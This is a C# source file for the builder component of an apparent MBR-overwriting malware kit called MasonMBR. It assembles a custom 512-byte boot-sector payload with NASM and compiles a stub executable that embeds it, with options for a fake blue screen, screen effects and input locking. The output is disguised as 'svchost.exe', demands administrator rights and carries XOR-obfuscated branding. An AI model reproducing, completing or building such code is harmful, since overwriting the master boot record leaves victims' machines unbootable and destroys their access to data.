using System;
using System.CodeDom.Compiler;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Windows.Forms;
using Microsoft.CSharp;

namespace MasonMBR.Core
{
    class Builder
    {
        readonly string _nasmPath;

        internal static readonly byte[] _buildDesc = {
            0x19,0x35,0x3E,0x3F,0x3E,0x7A,0x18,0x23,0x7A
        };

        internal Builder(string nasmPath)
        {
            _nasmPath = nasmPath;
        }

        internal void Run(BuildConfig cfg, string outPath)
        {
            byte[] asmBytes;
            byte[] imgBytes = null;

            if (cfg.ImageFrames != null && cfg.ImageFrames.Length > 1)
            {
                string asm = AsmBuilder.ForAnimatedImage(cfg.ImageFrames.Length, cfg.FrameDelays);
                asmBytes = Encoding.UTF8.GetBytes(asm);

                imgBytes = new byte[cfg.ImageFrames.Length * 64000];
                for (int i = 0; i < cfg.ImageFrames.Length; i++)
                    Buffer.BlockCopy(cfg.ImageFrames[i], 0, imgBytes, i * 64000, 64000);
            }
            else if (cfg.ImageMode && cfg.ImagePixels != null)
            {
                string asm = AsmBuilder.ForImage();
                asmBytes = Encoding.UTF8.GetBytes(asm);
                imgBytes = cfg.ImagePixels;
            }
            else
            {
                string txt = cfg.Text;
                if (string.IsNullOrWhiteSpace(txt)) txt = "www.abolhb.com";
                byte attr = (byte)((cfg.TextBg << 4) | cfg.TextFg);
                string asm = AsmBuilder.FromTextStyled(txt, attr, cfg.ScrBg);
                asmBytes = Encoding.UTF8.GetBytes(asm);
            }

            byte[] mbrBin = AssembleMBR(asmBytes);
            if (mbrBin == null) return;

            string src = MasonMG.Properties.Resources.Stub
                .Replace("{SAFE_TEXT}", Esc(cfg.GdiText ?? ""))
                .Replace("{VIDEO_EXT}", cfg.VideoExt ?? "mp4")
                .Replace("{AUDIO_EXT}", cfg.AudioExt ?? "mp3");

            Compile(src, outPath, cfg.IconPath, mbrBin, imgBytes,
                    cfg.Gdi, cfg.Bsod,
                    cfg.LockMouse, cfg.LockKeyboard,
                    cfg.ShowScreenImg, cfg.ScreenImgData,
                    cfg.PlayVideo, cfg.VideoData,
                    cfg.PlayAudio, cfg.AudioData);
        }

        byte[] AssembleMBR(byte[] asmBytes)
        {
            string tmpDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N").Substring(0, 8));

            try
            {
                Directory.CreateDirectory(tmpDir);
            }
            catch (Exception ex)
            {
                Err("Failed to create temp directory:\n" + ex.Message);
                return null;
            }

            string asmPath = Path.Combine(tmpDir, "m.asm");
            string binPath = Path.Combine(tmpDir, "m.bin");

            try
            {
                File.WriteAllBytes(asmPath, asmBytes);
            }
            catch (Exception ex)
            {
                Err("Failed to write ASM file:\n" + ex.Message);
                try { Directory.Delete(tmpDir, true); } catch { }
                return null;
            }

            string nasmErr  = "";
            string nasmOut  = "";
            int    exitCode = -1;

            try
            {
                using (var p = new Process())
                {
                    p.StartInfo.FileName               = _nasmPath;
                    p.StartInfo.Arguments              = "-f bin \"" + asmPath + "\" -o \"" + binPath + "\"";
                    p.StartInfo.UseShellExecute        = false;
                    p.StartInfo.CreateNoWindow         = true;
                    p.StartInfo.WindowStyle            = ProcessWindowStyle.Hidden;
                    p.StartInfo.RedirectStandardError  = true;
                    p.StartInfo.RedirectStandardOutput = true;
                    p.Start();
                    var errTask = p.StandardError.ReadToEndAsync();
                    var outTask = p.StandardOutput.ReadToEndAsync();
                    p.WaitForExit(15000);
                    nasmErr  = errTask.Result;
                    nasmOut  = outTask.Result;
                    exitCode = p.ExitCode;
                }
            }
            catch (Exception ex)
            {
                Err("Failed to start NASM:\n" + ex.Message);
                try { Directory.Delete(tmpDir, true); } catch { }
                return null;
            }

            if (exitCode != 0)
            {
                string msg = "NASM failed (exit " + exitCode + ").";
                if (!string.IsNullOrEmpty(nasmErr)) msg += "\n\n" + nasmErr.Trim();
                Err(msg);
                try { Directory.Delete(tmpDir, true); } catch { }
                return null;
            }

            byte[] bin = null;

            try
            {
                if (!File.Exists(binPath))
                {
                    Err("NASM produced no output file.");
                    try { Directory.Delete(tmpDir, true); } catch { }
                    return null;
                }

                bin = File.ReadAllBytes(binPath);
            }
            catch (Exception ex)
            {
                Err("Failed to read NASM output:\n" + ex.Message);
                try { Directory.Delete(tmpDir, true); } catch { }
                return null;
            }
            finally
            {
                try { Directory.Delete(tmpDir, true); } catch { }
            }

            if (bin.Length != 512)
            {
                Err("MBR output is " + bin.Length + " bytes (expected 512).");
                return null;
            }

            if (bin[510] != 0x55 || bin[511] != 0xAA)
            {
                Err("MBR is missing boot signature (0xAA55).");
                return null;
            }

            return bin;
        }

        static void Err(string msg)
        {
            MessageBox.Show(msg, "Assembly Error", MessageBoxButtons.OK, MessageBoxIcon.Error,
                MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);
        }

        static string Esc(string s)
        {
            if (string.IsNullOrEmpty(s)) return "";
            return s.Replace("\\", "\\\\")
                    .Replace("\"", "\\\"")
                    .Replace("\r", "\\r")
                    .Replace("\n", "\\n")
                    .Replace("\t", "\\t");
        }

        void Compile(string src, string outPath, string iconPath, byte[] mbrBin, byte[] imgBytes,
                     bool gdi, bool bsod,
                     bool lockMouse, bool lockKeyboard,
                     bool showScreen, byte[] screenData,
                     bool playVideo, byte[] videoData,
                     bool playAudio, byte[] audioData)
        {
            var prov = new CSharpCodeProvider();
            var opts = new CompilerParameters();
            opts.GenerateExecutable = true;
            opts.ReferencedAssemblies.Add("System.dll");
            opts.ReferencedAssemblies.Add("System.Core.dll");
            opts.ReferencedAssemblies.Add("Microsoft.CSharp.dll");
            if (gdi || showScreen || playVideo || playAudio)
            {
                opts.ReferencedAssemblies.Add("System.Windows.Forms.dll");
                opts.ReferencedAssemblies.Add("System.Drawing.dll");
            }
            if (playVideo)
            {
                string[] wpfAsm = {
                    "PresentationCore, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
                    "PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
                    "WindowsBase, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
                    "System.Xaml, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
                };
                foreach (string name in wpfAsm)
                {
                    try
                    {
                        string loc = System.Reflection.Assembly.Load(name).Location;
                        if (!string.IsNullOrEmpty(loc)) opts.ReferencedAssemblies.Add(loc);
                    }
                    catch { }
                }
            }

            string resDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N"));
            string tmpExe = Path.Combine(resDir, "out.exe");
            Directory.CreateDirectory(resDir);

            string mfPath    = Path.Combine(resDir, "app.manifest");
            string mbrPath    = Path.Combine(resDir, "mbr.bin");
            string imgPath    = Path.Combine(resDir, "img.bin");
            string screenPath = Path.Combine(resDir, "screen.bin");
            string videoPath  = Path.Combine(resDir, "video.bin");
            string audioPath  = Path.Combine(resDir, "audio.bin");

            File.WriteAllText(mfPath, GetManifest());

            string attrPath = Path.Combine(resDir, "a.cs");
            File.WriteAllText(attrPath, BuildAttribs());

            opts.OutputAssembly = tmpExe;
            opts.CompilerOptions = "/target:winexe /win32manifest:\"" + mfPath + "\"";

            if (gdi)          opts.CompilerOptions += " /define:ENABLE_GDI";
            if (bsod)         opts.CompilerOptions += " /define:ENABLE_BSOD";
            if (lockMouse)    opts.CompilerOptions += " /define:LOCK_MOUSE";
            if (lockKeyboard) opts.CompilerOptions += " /define:LOCK_KEYBOARD";
            if (showScreen)   opts.CompilerOptions += " /define:ENABLE_FULLSCREEN";
            if (playVideo)    opts.CompilerOptions += " /define:ENABLE_VIDEO";
            if (playAudio)    opts.CompilerOptions += " /define:ENABLE_AUDIO";

            if (!string.IsNullOrEmpty(iconPath) && File.Exists(iconPath))
                opts.CompilerOptions += " /win32icon:\"" + iconPath + "\"";

            File.WriteAllBytes(mbrPath, mbrBin);
            opts.EmbeddedResources.Add(mbrPath);

            if (imgBytes != null && imgBytes.Length > 0)
            {
                File.WriteAllBytes(imgPath, imgBytes);
                opts.EmbeddedResources.Add(imgPath);
            }

            if (showScreen && screenData != null && screenData.Length > 0)
            {
                File.WriteAllBytes(screenPath, screenData);
                opts.EmbeddedResources.Add(screenPath);
            }

            if (playVideo && videoData != null && videoData.Length > 0)
            {
                File.WriteAllBytes(videoPath, videoData);
                opts.EmbeddedResources.Add(videoPath);
            }

            if (playAudio && audioData != null && audioData.Length > 0)
            {
                File.WriteAllBytes(audioPath, audioData);
                opts.EmbeddedResources.Add(audioPath);
            }

            opts.CompilerOptions += " /optimize+ /debug-";

            var res = prov.CompileAssemblyFromSource(opts, src, File.ReadAllText(attrPath));

            if (!res.Errors.HasErrors && File.Exists(tmpExe))
                try { File.Copy(tmpExe, outPath, true); } catch { }

            try { Directory.Delete(resDir, true); } catch { }

            if (res.Errors.HasErrors)
            {
                var sb = new StringBuilder("Build failed:\n");
                foreach (CompilerError e in res.Errors)
                    sb.AppendLine("[" + e.Line + "] " + e.ErrorText);
                MessageBox.Show(sb.ToString(), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error,
                    MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);
            }
            else
            {
                ShowDone(outPath);
            }
        }

        static string BuildAttribs()
        {
            const byte k = 0xA3;
            string mg  = Xk(new byte[]{0xee,0xc2,0xd0,0xcc,0xcd,0xe4,0xd1,0xcc,0xd6,0xd3,0xd3}, k);
            string web = Xk(new byte[]{0xd4,0xd4,0xd4,0x8d,0xc2,0xc1,0xcc,0xcf,0xcb,0xc1,0x8d,0xc0,0xcc,0xce}, k);
            string cr  = Xk(new byte[]{0xe0,0xcc,0xd3,0xda,0xd1,0xca,0xc4,0xcb,0xd7,0x83,0x8b,0xe0,0x8a,0x83,0xee,0xc2,0xd0,0xcc,0xcd,0xe4,0xd1,0xcc,0xd6,0xd3,0xd3,0x83,0xdf,0x83,0xd4,0xd4,0xd4,0x8d,0xc2,0xc1,0xcc,0xcf,0xcb,0xc1,0x8d,0xc0,0xcc,0xce}, k);

            var sb = new System.Text.StringBuilder();
            sb.AppendLine("using System.Reflection;");
            sb.AppendLine("[assembly: AssemblyTitle(\""       + mg  + "\")]");
            sb.AppendLine("[assembly: AssemblyCompany(\""     + mg  + "\")]");
            sb.AppendLine("[assembly: AssemblyProduct(\""     + mg  + "\")]");
            sb.AppendLine("[assembly: AssemblyDescription(\"" + web + "\")]");
            sb.AppendLine("[assembly: AssemblyTrademark(\""   + web + "\")]");
            sb.AppendLine("[assembly: AssemblyCopyright(\""   + cr  + "\")]");
            sb.AppendLine("[assembly: AssemblyVersion(\"1.0.0.0\")]");
            sb.AppendLine("[assembly: AssemblyFileVersion(\"1.0.0.0\")]");
            return sb.ToString();
        }

        static string Xk(byte[] b, byte k)
        {
            var c = new char[b.Length];
            for (int i = 0; i < b.Length; i++) c[i] = (char)(b[i] ^ k);
            return new string(c);
        }

        static void ShowDone(string path)
        {
            var fi = new FileInfo(path);
            MessageBox.Show("Done!\n\nSize: " + fi.Length + " bytes\nPath: " + path,
                "Success", MessageBoxButtons.OK, MessageBoxIcon.Information,
                MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);
        }

        static string GetManifest()
        {
            return @"<?xml version=""1.0"" encoding=""utf-8""?>
<assembly manifestVersion=""1.0"" xmlns=""urn:schemas-microsoft-com:asm.v1"">
  <assemblyIdentity version=""1.0.0.0"" name=""svchost.exe""/>
  <trustInfo xmlns=""urn:schemas-microsoft-com:asm.v2"">
    <security>
      <requestedPrivileges xmlns=""urn:schemas-microsoft-com:asm.v3"">
        <requestedExecutionLevel level=""requireAdministrator"" uiAccess=""false"" />
      </requestedPrivileges>
    </security>
  </trustInfo>
  <compatibility xmlns=""urn:schemas-microsoft-com:compatibility.v1"">
    <application>
      <supportedOS Id=""{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}"" />
      <supportedOS Id=""{1f676c76-80e1-4239-95bb-83d0f6d0da78}"" />
      <supportedOS Id=""{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}"" />
      <supportedOS Id=""{35138b9a-5d96-4fbd-8e2d-a2440225f93a}"" />
    </application>
  </compatibility>
</assembly>";
        }
    }
}
